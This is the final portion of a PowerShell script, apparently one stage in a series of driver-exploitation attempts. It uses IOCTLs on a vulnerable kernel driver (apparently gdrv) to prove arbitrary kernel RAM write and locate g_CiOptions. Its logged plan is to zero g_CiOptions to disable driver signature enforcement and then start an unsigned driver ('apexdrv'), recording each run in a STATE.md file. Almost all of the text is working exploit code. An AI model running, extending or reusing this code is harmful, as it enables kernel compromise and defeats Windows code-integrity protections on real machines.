                    Log ("  2808 order{0} (a={1}): ok={2} err={3} back={4}{5}" -f $ord, $(if ($ord -eq 0) { 'kva' } else { 'src' }), $cres, $cer, $(if ($cback -ne $null) { [P37Prov]::Hex($cback) } else { '<read-fail/1450>' }), $(if ($cm) { '   <== WRITE' } else { '' }))
                    if ($cm) { $verdict.write = $true; $winPerm = 100 + $ord }
                }
            }
        }
        if (-not $verdict.write -and $kva -ne 0 -and $targetPa -ne 0 -and $srcPtr -ne [IntPtr]::Zero) {
            [P37Prov]::MemFill($srcPtr, 0x1000, [byte]0x99)
            $s7t = [P37Prov]::MemRead($srcPtr, 0x20)
            foreach ($ord in 0, 1) {
                $cgt = [uint32]0; $cer = [uint32]0
                if ($ord -eq 0) { $cres = [P37Prov]::Io2808($g, $kva, [uint64]$srcPtr.ToInt64(), 0x1000, [ref]$cgt, [ref]$cer) }
                else { $cres = [P37Prov]::Io2808($g, [uint64]$srcPtr.ToInt64(), $kva, 0x1000, [ref]$cgt, [ref]$cer) }
                $tback = [P37Prov]::GdrvReadStrict($g, $targetPa, 0x20)
                if ($tback -eq $null -and (Canary)) { $tback = [P37Prov]::GdrvReadStrict($g, $targetPa, 0x20) }
                $tm = $false
                if ($tback -ne $null) { $tm = [P37Prov]::BytesEqual($tback, $s7t, 0x20) }
                Log ("  2808 target order{0}: ok={1} err={2} back={3}{4}" -f $ord, $cres, $cer, $(if ($tback -ne $null) { [P37Prov]::Hex($tback) } else { '<read-fail/1450>' }), $(if ($tm) { '   <== WRITE' } else { '' }))
                if ($tm) { $verdict.write = $true; $winPerm = 200 + $ord }
            }
        }
    }
    finally {
        $fgt = [uint32]0; $fer = [uint32]0
        try { $fok = [P37Prov]::Io2804($g, $allocVa, [ref]$fgt, [ref]$fer) } catch { $fok = $false; $fer = 0xFFFF }
        Log ("  2804 free va=0x{0:x}: ok={1} err={2} info={3}" -f $allocVa, $fok, $fer, $fgt)
    }
} else { Log '  S7 alloc FAIL / no kernel VA returned' }
}

# ---- restore + cleanup ---------------------------------------------------
if ($verdict.write -and $winPerm -ge 200 -and $targetPa -ne 0 -and $srcPtr -ne [IntPtr]::Zero) {
    [P37Prov]::MemZero($srcPtr, 0x1000)
    $cgt = [uint32]0; $cer = [uint32]0
    if ($winPerm -eq 200) { $null = [P37Prov]::Io2808($g, $kva, [uint64]$srcPtr.ToInt64(), 0x1000, [ref]$cgt, [ref]$cer) }
    else { $null = [P37Prov]::Io2808($g, [uint64]$srcPtr.ToInt64(), $kva, 0x1000, [ref]$cgt, [ref]$cer) }
    $rz2 = $null
    try { $rz2 = [P37Prov]::GdrvRead($g, $targetPa, 0x10) } catch { $rz2 = $null }
    $rz2h = '<read-fail>'
    if ($rz2 -ne $null) { $rz2h = [P37Prov]::Hex($rz2) }
    Log ("  target re-zeroed through the 2808 path, readback={0}" -f $rz2h)
}
[P37Prov]::PageFree($srcPtr)
[P37Prov]::PageFree($ctlPtr)
[P37Prov]::PageFree($kvaPtr)

# ---- VERDICT -------------------------------------------------------------
Log ''
if ($script:ioSw) { try { $script:ioSw.Flush(); $script:ioSw.Close() } catch { } }
Log ("  io: issued={0} skipped_not_ram={1} lastPa=0x{2:x}" -f [P37Prov]::Issued, [P37Prov]::SkippedOutOfRam, [P37Prov]::LastIssuedPa)
Log '########## VERDICT ##########'
Log ("  S1 cr3            : {0}" -f $(if ($verdict.cr3) { 'PASS' } else { 'FAIL' }))
Log ("  S2 msr read       : {0}" -f $(if ($verdict.msr) { 'PASS' } else { 'FAIL' }))
Log ("  S3 ntoskrnl       : {0}" -f $(if ($verdict.nt) { 'PASS' } else { 'FAIL' }))
Log ("  S4 g_CiOptions    : {0}" -f $(if ($verdict.ci) { 'PASS' } else { 'FAIL' }))
Log ("  S5/S7 RAM write   : {0}" -f $(if ($verdict.write) { 'PASS' } else { 'FAIL' }))
Log ("  S6 mapK kva       : {0}" -f $(if ($verdict.mapk) { 'PASS' } else { 'FAIL' }))
Log ("  S7 kernel alloc   : {0}" -f $(if ($verdict.alloc) { 'PASS' } else { 'FAIL' }))
$contract = 'none'
if ($winPerm -ge 200) { $contract = ('0x2019->kva + 0x2808 vs target page (order {0})' -f ($winPerm - 200)) }
elseif ($winPerm -ge 100) { $contract = ('0x2019->kva + 0x2808 (order {0})' -f ($winPerm - 100)) }
elseif ($winPerm -ge 0) { $contract = ('0x2014 perm {0}: in={{u64,u32 0x1000,u32 pad {1},u64 srcVa}}' -f $winPerm, $(if ($winPerm -ge 2) { 1 } else { 0 })) }
Log ("  winning contract  : {0}" -f $contract)
if ($verdict.write) {
    Log '  *** KERNEL RAM WRITE AVAILABLE ***'
    if ($verdict.ci) {
        Log ("      => p38: write 0 to g_CiOptions pa=0x{0:x} through `" {1} `", `sc start apexdrv`, restore 3." -f $ciPa, $contract)
    } else {
        Log '      => write path proven, but cr3/ntoskrnl/g_CiOptions did not all resolve this run;'
        Log '         next run repeats discovery only (no write path change).'
    }
} else {
    Log '  *** NO RAM WRITE ***'
    Log '      => 2014 stays read-only; next leads: 0x2808 without 0x2800 handshake done (S7),'
    Log '         then 0x2440 SMI or apexr.sys loader.'
}
$state = Join-Path (Split-Path $PSScriptRoot -Parent) 'STATE.md'
if (Test-Path -LiteralPath $state) {
    $line = @()
    $line += ''
    $line += ('- p37 (`_ritual\p37_write.ps1`) {0}: cr3={1} nt={2} ci={3}(pa=0x{4:x}) write={5} via {6}; mapK={7} alloc={8}. io={9}.' -f (Get-Date -f 'dd/MM HH:mm'), $verdict.cr3, $verdict.nt, $verdict.ci, $ciPa, $verdict.write, $contract, $verdict.mapk, $verdict.alloc, [P37Prov]::Issued)
    $line | Add-Content -LiteralPath $state -Encoding UTF8
    Log ("  STATE.md appended: {0}" -f (Join-Path (Split-Path $PSScriptRoot -Parent) 'STATE.md'))
}
if ($g -ne [IntPtr]::Zero) { [P37Prov]::CloseHandle2($g) | Out-Null }
Log ("-- p37 END {0} --" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss'))
